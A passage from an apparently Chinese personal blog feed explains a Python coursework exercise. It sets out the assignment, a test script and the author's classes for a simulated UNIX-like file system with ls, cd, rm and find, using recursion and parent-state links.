example:</span><br><span class="line">&gt;&gt; fs.cd(&quot;home&quot;)</span><br><span class="line">&gt;&gt; fs.pwd() &#x27;home&#x27;</span><br><span class="line">&gt;&gt; fs.cd(&quot;..&quot;)</span><br><span class="line">&gt;&gt; fs.pwd() &#x27;root&#x27;</span><br><span class="line">Note that applying fs.cd(&quot;..&quot;) in a root node with no parent di- rectory will have no effect, but won’t return an error. </span><br><span class="line">(f)Implement a method rm(name) that will allow you to remove a file from the current working directory. A directory can only be deleted if it is empty.</span><br><span class="line">&gt;&gt; fs.rm(&quot;home&quot;)</span><br><span class="line">Sorry, the directory is not empty</span><br><span class="line">(g)Implement a method find(name) which tries to find a file name in a file system and returns the path to the first occurrence of the file if it finds it but False otherwise. For example:</span><br><span class="line">&gt;&gt; fs.find(&quot;gatos.jpg&quot;) &#x27;root/home/isaac/gatos.jpg&#x27;</span><br><span class="line">&gt;&gt; fs.find(&quot;thor&quot;) &#x27;root/home/thor&#x27;</span><br><span class="line">&gt;&gt; fs.find(&quot;unix&quot;) False</span><br><span class="line">Note that if you moved deeper in the directory tree using cd(), find(name) should only look from the current working directory.</span><br><span class="line">(h)The UNIX file system has many other operations that you could  implement here. Here are some ideas, but feel free to implement any functionality you find useful. Discuss ideas with us, but please add enough comments to understand what you are aiming to achieve.</span><br><span class="line">•chown -R: we have implemented chown() to change the owner of a single file or directory. Add an eﬀicient way to apply this function recursively to all files and sub directories of a folder.</span><br><span class="line">•Files and directories usually have permissions (read, write, and execution). Can you add that and functions to manipulate the permissions? (e.g. chmod).</span><br><span class="line">•Improve the ls() to show the owner, permissions (similar to what ls -l would do in UNIX.</span><br><span class="line">•In UNIX we can also move files from one directory to another using the command mv, indicating the destination PATH.</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="通过方法"><a href="#通过方法" class="headerlink" title="通过方法"></a>通过方法</h1><p>想通过测试，需要走下面的代码并且全部pass才能完成通过程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> file_system <span class="keyword">import</span> Directory, PlainFile, FileSystem</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Testing question 1&quot;</span>)</span><br><span class="line"><span class="comment"># question 1 should allow to create simple files and folders:</span></span><br><span class="line">file = PlainFile(<span class="string">&quot;boot.exe&quot;</span>)</span><br><span class="line">folder = Directory(<span class="string">&quot;Downloads&quot;</span>,[])</span><br><span class="line">    </span><br><span class="line">root = Directory(<span class="string">&quot;root&quot;</span>,[PlainFile(<span class="string">&quot;boot.exe&quot;</span>),</span><br><span class="line">               Directory(<span class="string">&quot;home&quot;</span>,[</span><br><span class="line">                   Directory(<span class="string">&quot;thor&quot;</span>,</span><br><span class="line">                      [PlainFile(<span class="string">&quot;hunde.jpg&quot;</span>),</span><br><span class="line">                       PlainFile(<span class="string">&quot;quatsch.txt&quot;</span>)]),</span><br><span class="line">                   Directory(<span class="string">&quot;isaac&quot;</span>,</span><br><span class="line">                      [PlainFile(<span class="string">&quot;gatos.jpg&quot;</span>)])])])</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Testing question 2&quot;</span>)</span><br><span class="line"><span class="comment"># question 2: implement the str</span></span><br><span class="line"><span class="built_in">print</span>(root)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Directory(root,[PlainFile(boot.exe),Directory(home,[Directory(thor,[PlainFile(hunde.jpg),PlainFile(quatsch.txt)],Directory(isaac,[PlainFile(gatos.jpg)]]]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Testing question 3&quot;</span>)</span><br><span class="line"><span class="comment"># question 3: test chown()</span></span><br><span class="line">file = PlainFile(<span class="string">&quot;boot.exe&quot;</span>)</span><br><span class="line">folder = Directory(<span class="string">&quot;Downloads&quot;</span>,[])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;file.owner: <span class="subst">&#123;file.owner&#125;</span>; folder: <span class="subst">&#123;folder.owner&#125;</span>&#x27;</span>)</span><br><span class="line">file.chown(<span class="string">&quot;root&quot;</span>)</span><br><span class="line">folder.chown(<span class="string">&quot;isaac&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;file.owner: <span class="subst">&#123;file.owner&#125;</span>; folder: <span class="subst">&#123;folder.owner&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Testing question 4&quot;</span>)</span><br><span class="line"><span class="comment">#question 4: ls() doesn&#x27;t return anything but prints.</span></span><br><span class="line">root.ls() </span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string">boot.exe</span></span><br><span class="line"><span class="string">home</span></span><br><span class="line"><span class="string">thor</span></span><br><span class="line"><span class="string">hunde.jpg</span></span><br><span class="line"><span class="string">quatsch.txt</span></span><br><span class="line"><span class="string">isaac</span></span><br><span class="line"><span class="string">gatos.jpg</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># question 5: create FileSystem</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Testing question 5a: basic filesystem and pwd&quot;</span>)</span><br><span class="line">fs = FileSystem(root)</span><br><span class="line"><span class="comment"># 5a:      </span></span><br><span class="line"><span class="built_in">print</span>(fs.pwd())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Testing question 5b: ls in working directory&quot;</span>)</span><br><span class="line"><span class="comment"># 5b: </span></span><br><span class="line">fs.ls()</span><br><span class="line"><span class="comment"># 5c:  </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Testing question 5c: cd&quot;</span>)</span><br><span class="line"><span class="comment"># if you try to move to a non existing directory or to a file, </span></span><br><span class="line"><span class="comment"># the method should complain:</span></span><br><span class="line">fs.cd(<span class="string">&quot;casa&quot;</span>)</span><br><span class="line"><span class="comment"># But you can move to an existing directory in the working directory.</span></span><br><span class="line">fs.cd(<span class="string">&quot;home&quot;</span>)</span><br><span class="line"><span class="comment"># if we now do ls(), you should only see the content in home:</span></span><br><span class="line">fs.ls()</span><br><span class="line"><span class="comment"># you can&#x27;t go backwards yet...</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Testing question 5d:  mkdir and create file&quot;</span>)</span><br><span class="line">fs = FileSystem(root) <span class="comment"># re-initialise fs</span></span><br><span class="line">fs.mkdir(<span class="string">&quot;test&quot;</span>) <span class="comment"># the owner of the directory should be &#x27;default&#x27; as not indicated.  fs.mkdir(&quot;test&quot;,&quot;isaac&quot;) would set the owner to isaac</span></span><br><span class="line">fs.cd(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">fs.create_file(<span class="string">&quot;test.txt&quot;</span>)</span><br><span class="line">fs.ls()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Testing question 5e:  dot dot&quot;</span></span><br><span class="line"><span class="comment"># to test this properly, let&#x27;s create the entire file system using our previous functions!</span></span><br><span class="line">root = Directory(<span class="string">&quot;root&quot;</span>,[],owner=<span class="string">&quot;root&quot;</span>)</span><br><span class="line">fs = FileSystem(root)</span><br><span class="line">fs.create_file(<span class="string">&quot;boot.exe&quot;</span>)  <span class="comment"># when creating a file we do not need to indicate owner, it will be the same as the working directory</span></span><br><span class="line">fs.mkdir(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">fs.mkdir(<span class="string">&quot;home&quot;</span>,owner=<span class="string">&quot;root&quot;</span>)</span><br><span class="line">fs.cd(<span class="string">&quot;home&quot;</span>)</span><br><span class="line">fs.mkdir(<span class="string">&quot;thor&quot;</span>,owner=<span class="string">&quot;thor&quot;</span>)</span><br><span class="line">fs.mkdir(<span class="string">&quot;isaac&quot;</span>,owner=<span class="string">&quot;isaac&quot;</span>)</span><br><span class="line">fs.cd(<span class="string">&quot;thor&quot;</span>)</span><br><span class="line">fs.create_file(<span class="string">&quot;hunde.jpg&quot;</span>)</span><br><span class="line">fs.create_file(<span class="string">&quot;quatsch.txt&quot;</span>)</span><br><span class="line">fs.cd(<span class="string">&quot;..&quot;</span>)</span><br><span class="line">fs.cd(<span class="string">&quot;isaac&quot;</span>)</span><br><span class="line">fs.create_file(<span class="string">&quot;gatos.jpg&quot;</span>)</span><br><span class="line">fs.cd(<span class="string">&quot;..&quot;</span>)</span><br><span class="line">fs.cd(<span class="string">&quot;..&quot;</span>)</span><br><span class="line">fs.ls()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Testing question 5f:  rm&quot;</span>)</span><br><span class="line"></span><br><span class="line">fs.rm(<span class="string">&quot;test&quot;</span>) <span class="comment"># shouldn&#x27;t work!</span></span><br><span class="line">fs.cd(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">fs.rm(<span class="string">&quot;test.txt&quot;</span>)</span><br><span class="line">fs.cd(<span class="string">&quot;..&quot;</span>)</span><br><span class="line">fs.rm(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">fs.ls()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Testing question 5e:  find&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(fs.find(<span class="string">&quot;gatos.jpg&quot;</span>))</span><br><span class="line">fs.cd(<span class="string">&quot;home&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(fs.find(<span class="string">&quot;boot.exe&quot;</span>)) <span class="comment"># shouldn&#x27;t find it!</span></span><br></pre></td></tr></table></figure><h1 id="程序编写"><a href="#程序编写" class="headerlink" title="程序编写"></a>程序编写</h1><h2 id="初始化PlainFile和Directory类"><a href="#初始化PlainFile和Directory类" class="headerlink" title="初始化PlainFile和Directory类"></a>初始化PlainFile和Directory类</h2><p>初始化两个类利用了基础的<code>__init__</code>方法进行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Everything is a file</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, owner</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.name = name</span><br><span class="line">        self.owner = <span class="string">&quot;default&quot;</span></span><br><span class="line">        </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PlainFile</span>(<span class="params">File</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    A plain file has a name ignoring its contents</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, owner=<span class="string">&quot;default&quot;</span></span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(name, owner)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">chown</span>(<span class="params">self, new_owner</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Allow to modify the owner of a file or directory.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.owner = new_owner</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Directory</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Includes a name and a list of files, recursively store the folder</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, root, args, owner=<span class="string">&quot;default&quot;</span></span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.root = root</span><br><span class="line">        self.sub = args</span><br><span class="line">        self.owner = owner</span><br></pre></td></tr></table></figure><p>显然这些初始化的过程并不困难，而是在后面的一些查找、遍历、递归当中。</p><h2 id="列出文件"><a href="#列出文件" class="headerlink" title="列出文件"></a>列出文件</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_ls</span>(<span class="params">self, subs, level</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">       <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">       :params subs, the root Directory.</span></span><br><span class="line"><span class="string">       :return None, print (recursively) the entire file system tree.</span></span><br><span class="line"><span class="string">       &quot;&quot;&quot;</span></span><br><span class="line">       iter_text = <span class="string">&quot;&quot;</span>.join([<span class="string">&quot;    &quot;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(level)])</span><br><span class="line">       _<span class="built_in">type</span> = <span class="built_in">type</span>(subs)</span><br><span class="line">       <span class="keyword">if</span> _<span class="built_in">type</span> == Directory:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(iter_text, subs.root))</span><br><span class="line">           level += <span class="number">1</span></span><br><span class="line">           self._ls(subs.sub, level)</span><br><span class="line">       <span class="keyword">elif</span> _<span class="built_in">type</span> == PlainFile:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(iter_text, subs.name))</span><br><span class="line">       <span class="keyword">elif</span> _<span class="built_in">type</span> == <span class="built_in">list</span>:</span><br><span class="line">           <span class="keyword">for</span> i <span class="keyword">in</span> subs:</span><br><span class="line">               self._ls(i, level)</span><br><span class="line">       </span><br><span class="line">       <span class="comment"># for sub in subs:</span></span><br><span class="line">       <span class="comment">#     if type(sub) == list:</span></span><br><span class="line">       <span class="comment">#         self.getrecursive_tree(sub)</span></span><br></pre></td></tr></table></figure><p>文件列出需要定义<code>level</code>层数，表示递归的层级，并且根据不同数据类型的字典子集，输出不同的数据结果。</p><h2 id="文件查找"><a href="#文件查找" class="headerlink" title="文件查找"></a>文件查找</h2><p>在文件查找当中，使用到DFS深度优先搜索的方式进行，以递归的方式进行实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_find</span>(<span class="params">self, name, workspace</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Using DFS to find the File or Directory</span></span><br><span class="line"><span class="string">        If found ,return path otherwise return False</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        subs = workspace.sub</span><br><span class="line">        </span><br><span class="line">        namelist = []</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> subs:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(file) == PlainFile:</span><br><span class="line">                namelist.append(file.name)</span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">type</span>(file) == Directory:</span><br><span class="line">                namelist.append(file.root)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> subs:</span><br><span class="line">            <span class="keyword">if</span> name <span class="keyword">in</span> namelist:</span><br><span class="line">                <span class="keyword">return</span> workspace.root + <span class="string">&quot;/&quot;</span> + name</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(file) == Directory:</span><br><span class="line">                    <span class="keyword">if</span> self._find(name, file):</span><br><span class="line">                        <span class="keyword">return</span> workspace.root + <span class="string">&quot;/&quot;</span> + self._find(name, file)</span><br></pre></td></tr></table></figure><h2 id="FileSystem文件系统类"><a href="#FileSystem文件系统类" class="headerlink" title="FileSystem文件系统类"></a>FileSystem文件系统类</h2><p>整片代码的精华就在于此文件系统类，一开始是根据指引进行编写，根据引导来构成代码程序，后面逐渐弄清楚的文件系统与其内部成员之间的关系，相当于一个双向链表（也类似于一个树形结构）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, workspace:Directory, parentstate = <span class="literal">None</span></span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self._pwd = workspace.root</span><br><span class="line">        self._workspace = workspace</span><br><span class="line">        self._parentstate = parentstate</span><br><span class="line">        <span class="comment">#Use parents state to store &quot;father&quot; status</span></span><br></pre></td></tr></table></figure><p>可见，其内部数据结构由三个成员组成：<code>_pwd</code>当前目录名称，<code>_wordspace</code>当前工作目录，<code>_parentstate</code>父目录，其中当前工作目录的数据类型为字典，用于储存当前环境下的工作路径，而<code>_parentstate</code>数据类型为<code>FileSystem</code>，那么文件系统直接的目录，怎么控制<code>cd</code>进入下级目录和进入上层目录呢？</p><p>由于是第一次在类内写链表，也折腾了很久，而且这个并不像是一般类型的链表，比如说<code>Directory</code>下的数组就不一定都是一个数据类型，其内部还有<code>PlainFile</code>的数据类型。</p><p>其<code>cd</code>用于控制当前目录的代码为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cd</span>(<span class="params">self, filename</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Change the workspace.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> filename == <span class="string">&quot;..&quot;</span> <span class="keyword">and</span> self._parentstate:</span><br><span class="line">            self._workspace = self._parentstate._workspace</span><br><span class="line">            self._pwd = self._parentstate._pwd</span><br><span class="line">            self._parentstate = self._parentstate._parentstate</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            subs = self._workspace.sub</span><br><span class="line">            namelist = []</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> subs:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(i) == PlainFile:</span><br><span class="line">                    namelist.append(<span class="literal">None</span>)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">type</span>(i) == Directory:</span><br><span class="line">                    namelist.append(i.root)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> filename <span class="keyword">in</span> namelist:</span><br><span class="line">                <span class="keyword">for</span> index, name <span class="keyword">in</span> <span class="built_in">enumerate</span>(namelist):</span><br><span class="line">                    <span class="keyword">if</span> filename == name:</span><br><span class="line">                        <span class="comment"># self._parentstate = FileSystem()</span></span><br><span class="line">                        new_filesys = FileSystem(self._workspace, self._parentstate)</span><br><span class="line">                        self._parentstate = new_filesys</span><br><span class="line">                        self._workspace = self._workspace.sub[index]</span><br><span class="line">                        self._pwd = self._workspace.root</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The directory does not exist!&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>cd</code> *..*则代表进入上层目录，而cd加文件夹则代表进入下级目录，那么最关键的问题在于：</p><blockquote><p>进入下级目录之后在目录当中新建文件，再返回上级目录，上级目录是否会包含下级目录的信息呢？还是单单一个新建的对象（地址不同）直接没有联系。</p></blockquote><p>因此需要处理好状态控制，处理好对象与对象之间互相的联系</p><p>仔细阅读代码，在查找到下级目录的时候，先新建一个<code>FileSystem</code>对象，此对象的<code>_parentstate</code>就是当前目录下的父目录，然后再更新<code>_parentstate</code>为当前的父目录。</p><p>因为<code>FileSystem</code>的<code>_workspace</code>当中，其指针地址一致，因此不会出现刚刚那样的问题，而如果要作出简短的总结，则是</p><blockquote><p>FileSystem是用于控制状态的类， 里面含有指向固定地址的指针。</p></blockquote><p><a href="https://imgtu.com/i/onc30U"><img src="https://z3.ax1x.com/2021/11/28/onc30U.md.png" alt="onc30U.md.png"></a></p><h3 id="其他示例"><a href="#其他示例" class="headerlink" title="其他示例"></a>其他示例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#模拟案例</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Content</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, data</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.data = data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Link</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,data , pre = <span class="literal">None</span>, <span class="built_in">next</span> = <span class="literal">None</span></span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.pre = pre</span><br><span class="line">        self.<span class="built_in">next</span> = <span class="built_in">next</span></span><br><span class="line">        self.data = data</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ls</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.data = self.pre.data</span><br><span class="line">        self.pre = self.pre.pre</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cd</span>(<span class="params">self</span>):</span></span><br><span class="line">        new = Link(self.data, self.pre)</span><br><span class="line">        self.pre = new</span><br><span class="line">        self.data = self.data.data[<span class="number">2</span>]</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">link = Link(Content([<span class="number">1</span>,<span class="number">2</span>, Content([<span class="number">3</span>, <span class="number">4</span>])]))</span><br><span class="line"><span class="built_in">print</span>(link.data.data)</span><br><span class="line">link.cd()</span><br><span class="line">link.data.data.append(<span class="number">8</span>)</span><br><span class="line">link.ls()</span><br><span class="line"><span class="built_in">print</span>(link.data.data[<span class="number">2</span>].data)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>虽然这只是使用python语言实现的一个很简单的文件系统，但是里面包含了如<code>DFS</code>、<code>双向链表</code>以及含有使用<code>__str__</code>重写函数的点，</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><p>《回溯算法实现在特定路径下查找文件》</p><p><a href="https://blog.csdn.net/leviopku/article/details/121499215">https://blog.csdn.net/leviopku/article/details/121499215</a></p></li><li><p> 《Python-深入理解递归函数中的return返回值》</p></li></ol><p>​       <a href="https://blog.csdn.net/weixin_40476348/article/details/98602498#:~:text=python%20">https://blog.csdn.net/weixin_40476348/article/details/98602498#:~:text=python%20</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;这是一篇关于python编写的小型文件储存程序，旨在于模拟Unix下&lt;code&gt;ls&lt;/code&gt;、&lt;code&gt;cd&lt;/code&gt;等的命令，在整一个中文互联网世界中，很难找到这样的实现方式，但是从数据结构和算法实现的角度来说存在许多价值。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="码农日常" scheme="http://favorhau.github.io/categories/%E7%A0%81%E5%86%9C%E6%97%A5%E5%B8%B8/"/>
    
    
